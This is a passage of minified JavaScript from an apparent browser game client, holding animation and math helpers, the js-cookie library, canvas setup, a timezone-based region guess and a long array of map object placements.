                        x: e.x + t,
                        y: e.y + i
                    }
                },
                move: function (e, t, i) {
                    e.x += Math.cos(i) * t,
                        e.y += Math.sin(i) * t
                },
                middle: function (e, t) {
                    return Math.floor((e - t) / 2)
                },
                middle_point: function (e, t) {
                    return {
                        x: (e.x + t.x) / 2,
                        y: (e.y + t.y) / 2
                    }
                },
                rand_sign: function () {
                    return .5 < Math.random() ? 1 : -1
                },
                get_rand_pos_in_circle: function (e, t, i) {
                    var n = this.rand_sign()
                        , r = this.rand_sign()
                        , o = Math.random() * Math.PI / 2;
                    return {
                        x: Math.floor(e + Math.cos(o) * n * i),
                        y: Math.floor(t + Math.sin(o) * r * i)
                    }
                },
                Box: function (e, t, i, n) {
                    this.x = e,
                        this.y = t,
                        this.w = i,
                        this.h = n
                },
                randomize_list: function (e) {
                    (a = []).push.apply(a, e);
                    for (var t = []; 0 < a.length;) {
                        var i = Math.floor(Math.random() * a.length);
                        t.push(a[i]),
                            a.splice(i, 1)
                    }
                    return t
                },
                restore_number: function (e) {
                    return e
                },
                simplify_number: function (e) {
                    if ("number" != typeof e)
                        return "0";
                    if (1e4 <= e) {
                        var t = Math.floor(Math.log10(e)) - 2
                            , t = Math.max(0, 3 - t)
                            , i = Math.floor(e / 1e3).toString();
                        if (t) {
                            for (var n = (i += "." + (e % 1e3 / 1e3).toString().substring(2).substring(0, t)).length - 1, r = 0; 0 < n && "0" == i[n]; n--)
                                r++;
                            "." == (i = i.substring(0, i.length - r))[i.length - 1] && (i = i.substring(0, i.length - 1))
                        }
                        return i + "k"
                    }
                    return e.toString()
                },
                ease_out_quad: function (e) {
                    return e * (2 - e)
                },
                ease_out_cubic: function (e) {
                    return --e * e * e + 1
                },
                ease_in_out_quad: function (e) {
                    return e < .5 ? 2 * e * e : (4 - 2 * e) * e - 1
                },
                ease_in_out_cubic: function (e) {
                    return e < .5 ? 4 * e * e * e : (e - 1) * (2 * e - 2) * (2 * e - 2) + 1
                },
                ease_in_out_quart: function (e) {
                    return e < .5 ? 8 * e * e * e * e : 1 - 8 * --e * e * e * e
                },
                ease_out_quart: function (e) {
                    return 1 - --e * e * e * e
                },
                ease_out_quint: function (e) {
                    return 1 + --e * e * e * e * e
                },
                LinearAnimation: function (e, t, i, n, r, o) {
                    return this.o = e,
                        this.v = t,
                        this.max = i,
                        this.min = n,
                        this.max_speed = r,
                        this.min_speed = o,
                        this.last = 0,
                        !(this.update = function () {
                            if (this.o) {
                                if ((e = this.v + qe * this.max_speed) > this.max)
                                    return this.v = this.max,
                                        !(this.o = !1);
                                this.v = e
                            } else {
                                var e;
                                (e = this.v - qe * this.min_speed) < this.min ? (this.v = this.min,
                                    this.o = !0) : this.v = e
                            }
                        }
                        )
                },
                Ease: function (e, t, i, n, r, o) {
                    this.fun = e,
                        this.ed = t,
                        this.em = i,
                        this.sx = n,
                        this.x = r,
                        this.ex = o,
                        this.restart = function () {
                            this.x = this.sex,
                                this.ed = 0
                        }
                        ,
                        this.ease = function (e) {
                            e !== this.ex && (this.ex = e,
                                this.sx = this.x,
                                this.ed = 0),
                                this.ex !== this.x && (this.ed += qe,
                                    this.ed > this.em ? this.x = this.ex : (e = this.fun(this.ed / this.em),
                                        this.x = this.sx + (this.ex - this.sx) * e))
                        }
                },
                Ease2d: function (e, t, i, n, r, o, a, s, _) {
                    this.fun = e,
                        this.ed = t,
                        this.em = i,
                        this.sx = n,
                        this.sy = r,
                        this.x = o,
                        this.y = a,
                        this.ex = s,
                        this.ey = _,
                        this.ease = function (e) {
                            e.x == this.ex && e.y == this.ey || (this.ex = e.x,
                                this.ey = e.y,
                                this.sx = this.x,
                                this.sy = this.y,
                                this.ed = 0),
                                this.ex == this.x && this.ey == this.y || (this.ed += qe,
                                    this.ed > this.em ? (this.x = this.ex,
                                        this.y = this.ey) : (e = this.fun(this.ed / this.em),
                                            this.x = this.sx + (this.ex - this.sx) * e,
                                            this.y = this.sy + (this.ey - this.sy) * e))
                        }
                },
                generate_token: function (e) {
                    for (var t = "", i = 0; i < e; i++)
                        t += String.fromCharCode(48 + Math.floor(74 * Math.random()));
                    return t
                },
                gup: function (e, t) {
                    t = t || location.href,
                        e = e.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
                    e = new RegExp("[\\?&]" + e + "=([^&#]*)").exec(t);
                    return null == e ? null : e[1]
                },
                inside_box: function (e, t) {
                    return e.x >= t.x && e.x <= t.x + t.w && e.y >= t.y && e.y <= t.y + t.h
                },
                intersect_aabb: function (e, t, i, n, r, o, a, s) {
                    return Math.max(e, r) < Math.min(t, o) && Math.max(i, a) < Math.min(n, s) ? 1 : 0
                },
                lerp: function (e, t, i) {
                    return (1 - i) * e + i * t
                },
                escape_html: function (e) {
                    return e.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;")
                }
            },
                Math.sign = Math.sign || function (e) {
                    return 0 === e ? 0 : 0 < e ? 1 : -1
                }
                ,
                Math.log10 = Math.log10 || function (e) {
                    return Math.log(e) / Math.LOG10
                }
                ,
                e = !(ee = function () {
                    function A() {
                        for (var e = 0, t = {}; e < arguments.length; e++) {
                            var i, n = arguments[e];
                            for (i in n)
                                t[i] = n[i]
                        }
                        return t
                    }
                    return function e(d) {
                        function T(e, t, i) {
                            var n, r;
                            if ("undefined" != typeof document) {
                                if (1 < arguments.length) {
                                    "number" == typeof (i = A({
                                        path: "/"
                                    }, T.defaults, i)).expires && ((r = new Date).setMilliseconds(r.getMilliseconds() + 864e5 * i.expires),
                                        i.expires = r);
                                    try {
                                        n = JSON.stringify(t),
                                            /^[\{\[]/.test(n) && (t = n)
                                    } catch (e) { }
                                    return t = d.write ? d.write(t, e) : encodeURIComponent(String(t)).replace(/%(23|24|26|2B|3A|3C|3E|3D|2F|3F|40|5B|5D|5E|60|7B|7D|7C)/g, decodeURIComponent),
                                        e = (e = (e = encodeURIComponent(String(e))).replace(/%(23|24|26|2B|5E|60|7C)/g, decodeURIComponent)).replace(/[\(\)]/g, escape),
                                        document.cookie = [e, "=", t, i.expires ? "; expires=" + i.expires.toUTCString() : "", i.path ? "; path=" + i.path : "", i.domain ? "; domain=" + i.domain : "", i.secure ? "; secure" : ""].join("")
                                }
                                e || (n = {});
                                for (var o = document.cookie ? document.cookie.split("; ") : [], a = /(%[0-9A-Z]{2})+/g, s = 0; s < o.length; s++) {
                                    var _ = o[s].split("=");
                                    '"' === (u = _.slice(1).join("=")).charAt(0) && (u = u.slice(1, -1));
                                    try {
                                        var E = _[0].replace(a, decodeURIComponent)
                                            , u = d.read ? d.read(u, E) : d(u, E) || u.replace(a, decodeURIComponent);
                                        if (this.json)
                                            try {
                                                u = JSON.parse(u)
                                            } catch (e) { }
                                        if (e === E) {
                                            n = u;
                                            break
                                        }
                                        e || (n[E] = u)
                                    } catch (e) { }
                                }
                                return n
                            }
                        }
                        return (T.set = T).get = function (e) {
                            return T.call(T, e)
                        }
                            ,
                            T.getJSON = function () {
                                return T.apply({
                                    json: !0
                                }, [].slice.call(arguments))
                            }
                            ,
                            T.defaults = {},
                            T.remove = function (e, t) {
                                T(e, "", A(t, {
                                    expires: -1
                                }))
                            }
                            ,
                            T.withConverter = e,
                            T
                    }(function () { })
                }
                ),
                "function" == typeof define && define.amd && (define(ee),
                    e = !0),
                "object" == typeof exports && (module.exports = ee(),
                    e = !0),
                e || (U = window.Cookies,
                    (Y = window.Cookies = ee()).noConflict = function () {
                        return window.Cookies = U,
                            Y
                    }
                );
            try {
                window.self !== window.top && ((loaded = Cookies.get("inIframe")) ? Cookies.remove("inIframe") : Cookies.set("inIframe", "1"))
            } catch (e) { }
            var J = document.getElementById("game_canvas")
                , fe = J.getContext("2d")
                , Le = J.width
                , Ge = J.height
                , ye = J.width / 2
                , He = J.height / 2
                , X = {
                    x: ye,
                    y: He
                }
                , Pe = 1
                , q = 1
                , Z = -1;
            window;
            e = "O";
            function c(e) {
                var t = new Image;
                return t.src = e.toDataURL("image/png"),
                    t.width = e.width,
                    t.height = e.height,
                    t.isLoaded = 1,
                    t
            }
            J.oncontextmenu = function () {
                return !1
            }
                ;
            e += "N";
            var me = window.devicePixelRatio || 1
                , De = fe.webkitBackingStorePixelRatio || fe.mozBackingStorePixelRatio || fe.msBackingStorePixelRatio || fe.oBackingStorePixelRatio || fe.backingStorePixelRatio || 1;
            function Q() {
                xe && (xe.cam.h = document.documentElement.clientHeight,
                    xe.cam.w = document.documentElement.clientWidth),
                    J.width != window.innerWidth && (J.width = window.innerWidth,
                        Le = J.width,
                        ye = J.width / 2),
                    J.height != window.innerHeight && (J.height = window.innerHeight,
                        Ge = J.height,
                        He = J.height / 2),
                    X = {
                        x: ye,
                        y: He
                    };
                var e = J.width
                    , t = J.height;
                q = -1 === Z ? me / De : Z,
                    J.width = e * q,
                    J.height = t * q,
                    J.style.width = e + "px",
                    J.style.height = t + "px",
                    fe.scale(q, q),
                    xe && (xe.cam.rw = e,
                        xe.cam.rh = t),
                    lo.is_run ? lo.update() : Se.is_run ? Se.update() : Je.is_run ? Je.update() : To.is_run && To.update()
            }
            var ee = document.getElementById("game_body");
            ee.ondragstart = function () {
                return !1
            }
                ,
                ee.ondrop = function () {
                    return !1
                }
                ,
                ee.onresize = Q;
            for (var te = 0, ie = ["ms", "moz", "webkit", "o"], ne = 0; ne < ie.length && !window.requestAnimationFrame; ++ne)
                window.requestAnimationFrame = window[ie[ne] + "RequestAnimationFrame"],
                    window.cancelAnimationFrame = window[ie[ne] + "CancelAnimationFrame"] || window[ie[ne] + "CancelRequestAnimationFrame"];
            window.requestAnimationFrame || (window.requestAnimationFrame = function (e) {
                var t = (new Date).getTime()
                    , i = Math.max(0, 16 - (t - te))
                    , n = window.setTimeout(function () {
                        e(t + i)
                    }, i);
                return te = t + i,
                    n
            }
            ),
                window.cancelAnimationFrame || (window.cancelAnimationFrame = function (e) {
                    clearTimeout(e)
                }
                );
            var ve = navigator.language || navigator.userLanguage
                , e = -(new Date).getTimezoneOffset() / 60
                , ee = "South America"
                , re = "Europe"
                , k = (-2 <= e && e <= 2 ? re = "Europe" : 2 < e && e <= 5 ? re = "Russia" : 5 < e && e <= 9 ? re = "Asia" : 9 < e ? re = "Australia" : -5 <= e && e < -2 ? re = "pt-BR" === ve || "pt-br" === ve || "pt" === ve || "pt-pt" === ve ? ee : "North America" : e < -5 && (re = "pt-BR" === ve || "pt-br" === ve || "pt" === ve || "pt-pt" === ve ? ee : "West America"),
                {
                    Random: function (e) {
                        var t = 2147483648
                            , i = e || Math.floor(Math.random() * (t - 1));
                        this.init = function (e) {
                            i = e || Math.floor(Math.random() * (t - 1))
                        }
                            ,
                            this.get = function () {
                                return (i = (1103515245 * i + 12345) % t) / t
                            }
                    }
                })
                , Ae = [[0, "DRAGON", 18, 6, 66, 35, 0], [0, "WINTER", 91, 18, 5, 40, 8], [0, "DESERT", 135, 180, 89, 124, 5], [0, "LAVA", 142, 6, 82, 99, 6], [0, "FOREST", 6, 150, 90, 154, 8], [0, "WINTER", 6, 6, 90, 150, 0], [1, "b", 0, 5, 175, 0], [1, "t", 2, 5, 174, 0], [1, "t", 5, 5, 173, 0], [1, "b", 3, 5, 176, 0], [1, "t", 0, 5, 177, 0], [1, "t", 3, 5, 178, 0], [1, "t", 4, 5, 179, 0], [1, "b", 0, 5, 180, 0], [1, "t", 5, 5, 181, 0], [1, "b", 2, 5, 182, 0], [1, "b", 1, 5, 183, 0], [1, "b", 2, 5, 184, 0], [1, "t", 5, 5, 185, 0], [1, "t", 2, 5, 186, 0], [1, "t", 0, 5, 187, 0], [1, "t", 5, 5, 188, 0], [1, "t", 1, 5, 189, 0], [1, "b", 2, 5, 190, 0], [1, "t", 4, 5, 191, 0], [1, "b", 3, 5, 192, 0], [1, "t", 5, 5, 193, 0], [1, "t", 0, 5, 194, 0], [1, "t", 3, 5, 195, 0], [1, "b", 0, 5, 196, 0], [1, "t", 5, 5, 197, 0], [1, "t", 2, 5, 198, 0], [1, "b", 2, 5, 199, 0], [1, "t", 4, 5, 200, 0], [1, "t", 1, 5, 201, 0], [1, "b", 1, 5, 202, 0], [1, "t", 5, 5, 203, 0], [1, "t", 2, 5, 204, 0], [1, "t", 4, 5, 205, 0], [1, "b", 2, 5, 206, 0], [1, "t", 1, 5, 207, 0], [1, "t", 4, 5, 208, 0], [1, "t", 2, 5, 209, 0], [1, "b", 0, 5, 210, 0], [1, "t", 5, 5, 211, 0], [1, "t", 1, 5, 212, 0], [1, "t", 2, 5, 213, 0], [1, "b", 3, 5, 214, 0], [1, "t", 5, 5, 215, 0], [1, "b", 0, 5, 216, 0], [1, "t", 4, 5, 217, 0], [1, "t", 2, 5, 218, 0], [1, "t", 1, 5, 219, 0], [1, "t", 3, 5, 220, 0], [1, "t", 5, 5, 221, 0], [1, "t", 2, 5, 222, 0], [1, "t", 4, 5, 223, 0], [1, "b", 3, 5, 224, 0], [1, "t", 1, 5, 225, 0], [1, "t", 3, 5, 226, 0], [1, "b", 0, 5, 227, 0], [1, "t", 3, 5, 228, 0], [1, "t", 5, 5, 229, 0], [1, "t", 2, 5, 230, 0], [1, "t", 0, 5, 231, 0], [1, "b", 2, 5, 232, 0], [1, "t", 1, 5, 233, 0], [1, "t", 4, 5, 234, 0], [1, "b", 1, 5, 235, 0], [1, "t", 4, 5, 236, 0], [1, "t", 2, 5, 237, 0], [1, "t", 0, 5, 238, 0], [1, "t", 4, 5, 239, 0], [1, "b", 2, 5, 240, 0], [1, "t", 5, 5, 241, 0], [1, "b", 1, 5, 242, 0], [1, "t", 4, 5, 243, 0], [1, "t", 2, 5, 244, 0], [1, "t", 1, 5, 245, 0], [1, "b", 1, 5, 246, 0], [1, "t", 3, 5, 247, 0], [1, "b", 2, 5, 248, 0], [1, "t", 5, 5, 249, 0], [1, "t", 2, 5, 250, 0], [1, "t", 4, 5, 251, 0], [1, "b", 1, 5, 252, 0], [1, "t", 4, 5, 253, 0], [1, "t", 1, 5, 254, 0], [1, "t", 3, 5, 255, 0], [1, "t", 5, 5, 256, 0], [1, "b", 2, 5, 257, 0], [1, "t", 4, 5, 258, 0], [1, "b", 3, 5, 259, 0], [1, "t", 5, 5, 260, 0], [1, "b", 0, 5, 261, 0], [1, "t", 3, 5, 262, 0], [1, "t", 4, 5, 263, 0], [1, "t", 2, 5, 264, 0], [1, "b", 1, 5, 265, 0], [1, "b", 2, 5, 266, 0], [1, "t", 3, 5, 267, 0], [1, "t", 4, 5, 268, 0], [1, "t", 0, 5, 269, 0], [1, "t", 5, 5, 270, 0], [1, "t", 3, 5, 271, 0], [1, "t", 4, 5, 272, 0], [1, "t", 1, 5, 273, 0], [1, "b", 2, 5, 274, 0], [1, "t", 1, 5, 275, 0], [1, "t", 4, 5, 276, 0], [1, "b", 1, 5, 277, 0], [1, "b", 2, 5, 278, 0], [1, "t", 1, 5, 279, 0], [1, "t", 4, 5, 280, 0], [1, "t", 2, 5, 281, 0], [1, "t", 5, 5, 282, 0], [1, "b", 2, 5, 283, 0], [1, "t", 1, 5, 284, 0], [1, "b", 3, 5, 285, 0], [1, "t", 4, 5, 286, 0], [1, "t", 0, 5, 287, 0], [1, "t", 5, 5, 288, 0], [1, "t", 2, 5, 289, 0], [1, "b", 1, 5, 290, 0], [1, "t", 4, 5, 292, 0], [1, "t", 2, 5, 291, 0], [1, "b", 2, 5, 293, 0], [1, "t", 1, 5, 294, 0], [1, "t", 3, 5, 295, 0], [1, "t", 5, 5, 296, 0], [1, "b", 0, 5, 297, 0], [1, "b", 3, 5, 298, 0], [1, "t", 4, 5, 299, 0], [1, "t", 2, 5, 300, 0], [1, "t", 4, 5, 301, 0], [1, "b", 0, 5, 302, 0], [1, "b", 2, 5, 303, 0], [1, "t", 1, 6, 303, 0], [1, "t", 2, 7, 303, 0], [1, "t", 1, 5, 304, 0], [1, "t", 3, 6, 304, 0], [1, "t", 4, 7, 304, 0], [1, "t", 5, 8, 303, 0], [1, "b", 1, 8, 304, 0], [1, "b", 2, 9, 304, 0], [1, "b", 3, 12, 303, 0], [1, "b", 3, 17, 304, 0], [1, "t", 1, 9, 303, 0], [1, "t", 1, 15, 304, 0], [1, "t", 1, 13, 303, 0], [1, "t", 3, 10, 303, 0], [1, "t", 3, 14, 304, 0], [1, "t", 4, 10, 304, 0], [1, "t", 5, 11, 304, 0], [1, "t", 5, 14, 303, 0], [1, "t", 5, 16, 304, 0], [1, "t", 5, 13, 304, 0], [1, "t", 2, 12, 304, 0], [1, "t", 1, 11, 303, 0], [1, "b", 3, 15, 303, 0], [1, "b", 0, 16, 303, 0], [1, "t", 3, 17, 303, 0], [1, "t", 4, 18, 303, 0], [1, "t", 2, 19, 303, 0], [1, "t", 1, 20, 303, 0], [1, "b", 1, 21, 303, 0], [1, "t", 2, 22, 303, 0], [1, "t", 4, 23, 303, 0], [1, "b", 3, 24, 303, 0], [1, "t", 5, 25, 303, 0], [1, "t", 1, 26, 303, 0], [1, "t", 2, 27, 303, 0], [1, "t", 4, 28, 303, 0], [1, "b", 0, 18, 304, 0], [1, "t", 2, 19, 304, 0], [1, "t", 5, 20, 304, 0], [1, "b", 2, 21, 304, 0], [1, "t", 4, 22, 304, 0], [1, "t", 2, 23, 304, 0], [1, "t", 1, 24, 304, 0], [1, "t", 3, 25, 304, 0], [1, "t", 0, 27, 304, 0], [1, "t", 5, 26, 304, 0], [1, "b", 2, 28, 304, 0], [1, "t", 1, 29, 304, 0], [1, "b", 1, 29, 303, 0], [1, "b", 2, 30, 303, 0], [1, "t", 4, 31, 303, 0], [1, "t", 0, 32, 303, 0], [1, "t", 5, 33, 303, 0], [1, "t", 2, 34, 303, 0], [1, "t", 4, 35, 303, 0], [1, "t", 1, 36, 303, 0], [1, "b", 3, 37, 303, 0], [1, "t", 2, 32, 304, 0], [1, "t", 4, 30, 304, 0], [1, "t", 1, 31, 304, 0], [1, "b", 1, 33, 304, 0], [1, "t", 2, 35, 304, 0], [1, "t", 5, 34, 304, 0], [1, "b", 2, 36, 304, 0], [1, "t", 5, 37, 304, 0], [1, "t", 1, 38, 304, 0], [1, "b", 1, 40, 303, 0], [1, "t", 3, 39, 303, 0], [1, "t", 3, 42, 304, 0], [1, "t", 5, 38, 303, 0], [1, "t", 5, 39, 304, 0], [1, "t", 5, 41, 303, 0], [1, "t", 4, 41, 304, 0], [1, "t", 4, 44, 303, 0], [1, "b", 2, 40, 304, 0], [1, "b", 2, 43, 303, 0], [1, "t", 1, 42, 303, 0], [1, "t", 1, 43, 304, 0], [1, "t", 5, 44, 304, 0], [1, "b", 1, 45, 303, 0], [1, "t", 2, 45, 304, 0], [1, "t", 2, 46, 303, 0], [1, "t", 4, 47, 303, 0], [1, "b", 0, 48, 303, 0], [1, "t", 5, 49, 303, 0], [1, "t", 2, 50, 303, 0], [1, "t", 1, 51, 303, 0], [1, "t", 4, 52, 303, 0], [1, "t", 5, 46, 304, 0], [1, "t", 2, 47, 304, 0], [1, "t", 5, 48, 304, 0], [1, "t", 1, 49, 304, 0], [1, "t", 2, 50, 304, 0], [1, "b", 1, 53, 303, 0], [1, "b", 2, 51, 304, 0], [1, "t", 5, 52, 304, 0], [1, "t", 3, 53, 304, 0], [1, "b", 2, 54, 303, 0], [1, "t", 5, 54, 304, 0], [1, "t", 5, 55, 303, 0], [1, "t", 3, 56, 303, 0], [1, "t", 4, 57, 303, 0], [1, "t", 5, 58, 303, 0], [1, "b", 1, 55, 304, 0], [1, "t", 2, 56, 304, 0], [1, "t", 0, 57, 304, 0], [1, "t", 3, 58, 304, 0], [1, "t", 3, 63, 304, 0], [1, "t", 3, 59, 303, 0], [1, "t", 4, 59, 304, 0], [1, "t", 5, 60, 303, 0], [1, "t", 0, 60, 304, 0], [1, "t", 0, 66, 303, 0], [1, "t", 0, 70, 304, 0], [1, "t", 3, 61, 304, 0], [1, "t", 3, 67, 303, 0], [1, "t", 3, 73, 304, 0], [1, "t", 3, 76, 303, 0], [1, "t", 3, 78, 304, 0], [1, "t", 1, 61, 303, 0], [1, "t", 1, 73, 303, 0], [1, "t", 1, 79, 303, 0], [1, "b", 2, 62, 304, 0], [1, "b", 2, 70, 303, 0], [1, "t", 5, 62, 303, 0], [1, "t", 5, 68, 303, 0], [1, "t", 5, 71, 304, 0], [1, "t", 5, 77, 304, 0], [1, "t", 5, 75, 303, 0], [1, "t", 5, 64, 304, 0], [1, "t", 5, 65, 303, 0], [1, "t", 5, 80, 303, 0], [1, "t", 1, 76, 304, 0], [1, "t", 3, 63, 303, 0], [1, "t", 5, 82, 304, 0], [1, "b", 2, 65, 304, 0], [1, "t", 1, 64, 303, 0], [1, "t", 1, 68, 304, 0], [1, "t", 2, 69, 304, 0], [1, "t", 4, 69, 303, 0], [1, "t", 5, 66, 304, 0], [1, "t", 0, 67, 304, 0], [1, "b", 2, 72, 304, 0], [1, "t", 0, 71, 303, 0], [1, "t", 4, 72, 303, 0], [1, "t", 4, 74, 304, 0], [1, "t", 2, 74, 303, 0], [1, "t", 3, 75, 304, 0], [1, "t", 1, 77, 303, 0], [1, "t", 4, 78, 303, 0], [1, "t", 4, 79, 304, 0], [1, "t", 2, 80, 304, 0], [1, "b", 1, 81, 304, 0], [1, "t", 2, 81, 303, 0], [1, "t", 5, 82, 303, 0], [1, "t", 1, 83, 303, 0], [1, "b", 2, 83, 304, 0], [1, "t", 1, 84, 304, 0], [1, "t", 4, 84, 303, 0], [1, "t", 5, 85, 304, 0], [1, "t", 3, 85, 303, 0], [1, "b", 2, 86, 304, 0], [1, "t", 1, 86, 303, 0], [1, "b", 3, 87, 303, 0], [1, "t", 4, 87, 304, 0], [1, "t", 4, 88, 303, 0], [1, "t", 0, 88, 304, 0], [1, "b", 1, 89, 303, 0], [1, "t", 3, 89, 304, 0], [1, "t", 3, 90, 303, 0], [1, "t", 4, 90, 304, 0], [1, "t", 4, 91, 303, 0], [1, "t", 0, 91, 304, 0], [1, "b", 2, 92, 303, 0], [1, "t", 4, 92, 304, 0], [1, "t", 5, 93, 303, 0], [1, "t", 0, 93, 304, 0], [1, "b", 3, 94, 303, 0], [1, "b", 0, 94, 304, 0], [1, "b", 0, 95, 303, 0], [1, "t", 2, 95, 304, 0], [1, "f", 1, 5, 151, 1], [1, "f", 2, 5, 153, 1], [1, "f", 0, 5, 152, 1], [1, "f", 0, 5, 147, 1], [1, "f", 0, 5, 144, 1], [1, "f", 0, 5, 140, 1], [1, "f", 1, 5, 149, 1], [1, "f", 1, 5, 146, 1], [1, "f", 1, 5, 143, 1], [1, "f", 1, 5, 141, 1], [1, "f", 2, 5, 150, 1], [1, "f", 2, 5, 148, 1], [1, "f", 2, 5, 145, 1], [1, "f", 2, 5, 142, 1], [1, "f", 2, 5, 139, 1], [1, "f", 2, 5, 136, 1], [1, "f", 2, 5, 133, 1], [1, "f", 2, 5, 131, 1], [1, "f", 2, 5, 127, 1], [1, "f", 2, 5, 125, 1], [1, "f", 1, 5, 138, 1], [1, "f", 1, 5, 135, 1], [1, "f", 1, 5, 132, 1], [1, "f", 1, 5, 130, 1], [1, "f", 1, 5, 128, 1], [1, "f", 1, 5, 126, 1], [1, "f", 1, 5, 124, 1], [1, "f", 0, 5, 129, 1], [1, "f", 0, 5, 134, 1], [1, "f", 0, 5, 137, 1], [1, "f", 0, 5, 123, 1], [1, "f", 1, 5, 122, 1], [1, "f", 1, 5, 120, 1], [1, "f", 1, 5, 117, 1], [1, "f", 1, 5, 115, 1], [1, "f", 1, 5, 111, 1], [1, "f", 1, 5, 108, 1], [1, "f", 2, 5, 121, 1], [1, "f", 2, 5, 118, 1], [1, "f", 2, 5, 116, 1], [1, "f", 2, 5, 113, 1], [1, "f", 2, 5, 110, 1], [1, "f", 0, 5, 119, 1], [1, "f", 0, 5, 114, 1], [1, "f", 0, 5, 112, 1], [1, "f", 0, 5, 109, 1], [1, "f", 1, 5, 106, 1], [1, "f", 1, 5, 103, 1], [1, "f", 1, 5, 100, 1], [1, "f", 1, 5, 97, 1], [1, "f", 1, 5, 95, 1], [1, "f", 2, 5, 107, 1], [1, "f", 2, 5, 105, 1], [1, "f", 2, 5, 102, 1], [1, "f", 2, 5, 99, 1], [1, "f", 2, 5, 96, 1], [1, "f", 2, 5, 94, 1], [1, "f", 0, 5, 104, 1], [1, "f", 0, 5, 101, 1], [1, "f", 0, 5, 98, 1], [1, "f", 0, 5, 93, 1], [1, "f", 1, 5, 92, 1], [1, "f", 1, 5, 89, 1], [1, "f", 1, 5, 86, 1], [1, "f", 1, 5, 83, 1], [1, "f", 1, 5, 80, 1], [1, "f", 1, 5, 78, 1], [1, "f", 2, 5, 90, 1], [1, "f", 2, 5, 88, 1], [1, "f", 2, 5, 85, 1], [1, "f", 2, 5, 82, 1], [1, "f", 2, 5, 79, 1], [1, "f", 2, 5, 77, 1], [1, "f", 2, 5, 75, 1], [1, "f", 2, 5, 72, 1], [1, "f", 0, 5, 91, 1], [1, "f", 0, 5, 87, 1], [1, "f", 0, 5, 84, 1], [1, "f", 0, 5, 81, 1], [1, "f", 0, 5, 76, 1], [1, "f", 0, 5, 74, 1], [1, "f", 1, 5, 73, 1], [1, "f", 1, 5, 71, 1], [1, "f", 1, 5, 68, 1], [1, "f", 1, 5, 66, 1], [1, "f", 1, 5, 62, 1], [1, "f", 1, 5, 59, 1], [1, "f", 1, 5, 56, 1], [1, "f", 1, 5, 53, 1], [1, "f", 1, 5, 50, 1], [1, "f", 2, 5, 70, 1], [1, "f", 2, 5, 67, 1], [1, "f", 2, 5, 65, 1], [1, "f", 2, 5, 63, 1], [1, "f", 2, 5, 60, 1], [1, "f", 2, 5, 57, 1], [1, "f", 2, 5, 54, 1], [1, "f", 2, 5, 51, 1], [1, "f", 0, 5, 69, 1], [1, "f", 0, 5, 64, 1], [1, "f", 0, 5, 61, 1], [1, "f", 0, 5, 58, 1], [1, "f", 0, 5, 55, 1], [1, "f", 0, 5, 52, 1], [1, "f", 0, 5, 49, 1], [1, "f", 0, 5, 45, 1], [1, "f", 0, 5, 42, 1], [1, "f", 0, 5, 38, 1], [1, "f", 0, 5, 34, 1], [1, "f", 0, 5, 31, 1], [1, "f", 1, 5, 48, 1], [1, "f", 1, 5, 44, 1], [1, "f", 1, 5, 41, 1], [1, "f", 1, 5, 37, 1], [1, "f", 1, 5, 33, 1], [1, "f", 1, 5, 29, 1], [1, "f", 2, 5, 30, 1], [1, "f", 2, 5, 32, 1], [1, "f", 2, 5, 35, 1], [1, "f", 2, 5, 39, 1], [1, "f", 2, 5, 46, 1], [1, "f", 2, 5, 43, 1], [1, "f", 1, 5, 47, 1], [1, "f", 0, 5, 40, 1], [1, "f", 0, 5, 36, 1], [1, "f", 0, 5, 28, 1], [1, "f", 1, 5, 25, 1], [1, "f", 1, 5, 22, 1], [1, "f", 1, 5, 20, 1], [1, "f", 1, 5, 16, 1], [1, "f", 1, 5, 13, 1], [1, "f", 1, 5, 10, 1], [1, "f", 2, 5, 27, 1], [1, "f", 2, 5, 24, 1], [1, "f", 2, 5, 21, 1], [1, "f", 2, 5, 19, 1], [1, "f", 2, 5, 15, 1], [1, "f", 2, 5, 12, 1], [1, "f", 2, 5, 9, 1], [1, "f", 0, 5, 26, 1], [1, "f", 0, 5, 23, 1], [1, "f", 0, 5, 14, 1], [1, "f", 0, 5, 11, 1], [1, "f", 0, 5, 17, 1], [1, "f", 1, 5, 18, 1], [1, "f", 1, 5, 8, 1], [1, "f", 0, 5, 7, 1], [1, "f", 1, 5, 6, 1], [1, "f", 0, 5, 5, 1], [1, "f", 1, 6, 5, 1], [1, "f", 2, 7, 5, 1], [1, "f", 0, 8, 5, 1], [1, "f", 1, 9, 5, 1], [1, "f", 1, 12, 5, 1], [1, "f", 1, 15, 5, 1], [1, "f", 1, 17, 5, 1], [1, "f", 1, 22, 5, 1], [1, "f", 1, 26, 5, 1], [1, "f", 2, 10, 5, 1], [1, "f", 2, 13, 5, 1], [1, "f", 2, 16, 5, 1], [1, "f", 2, 18, 5, 1], [1, "f", 2, 21, 5, 1], [1, "f", 2, 23, 5, 1], [1, "f", 2, 25, 5, 1], [1, "f", 2, 27, 5, 1], [1, "f", 0, 11, 5, 1], [1, "f", 0, 14, 5, 1], [1, "f", 0, 19, 5, 1], [1, "f", 0, 24, 5, 1], [1, "f", 0, 28, 5, 1], [1, "f", 1, 20, 5, 1], [1, "f", 1, 29, 5, 1], [1, "f", 1, 32, 5, 1], [1, "f", 1, 35, 5, 1], [1, "f", 1, 38, 5, 1], [1, "f", 1, 41, 5, 1], [1, "f", 1, 45, 5, 1], [1, "f", 2, 30, 5, 1], [1, "f", 2, 33, 5, 1], [1, "f", 2, 36, 5, 1], [1, "f", 2, 39, 5, 1], [1, "f", 2, 42, 5, 1], [1, "f", 2, 44, 5, 1], [1, "f", 2, 46, 5, 1], [1, "f", 0, 43, 5, 1], [1, "f", 0, 40, 5, 1], [1, "f", 0, 37, 5, 1], [1, "f", 0, 34, 5, 1], [1, "f", 0, 31, 5, 1], [1, "f", 0, 47, 5, 1], [1, "f", 1, 48, 5, 1], [1, "f", 1, 51, 5, 1], [1, "f", 1, 53, 5, 1], [1, "f", 1, 57, 5, 1], [1, "f", 1, 60, 5, 1], [1, "f", 1, 63, 5, 1], [1, "f", 1, 65, 5, 1], [1, "f", 2, 64, 5, 1], [1, "f", 2, 62, 5, 1], [1, "f", 2, 59, 5, 1], [1, "f", 2, 56, 5, 1], [1, "f", 2, 52, 5, 1], [1, "f", 2, 49, 5, 1], [1, "f", 2, 54, 5, 1], [1, "f", 0, 50, 5, 1], [1, "f", 0, 55, 5, 1], [1, "f", 0, 58, 5, 1], [1, "f", 0, 61, 5, 1], [1, "f", 0, 66, 5, 1], [1, "f", 1, 67, 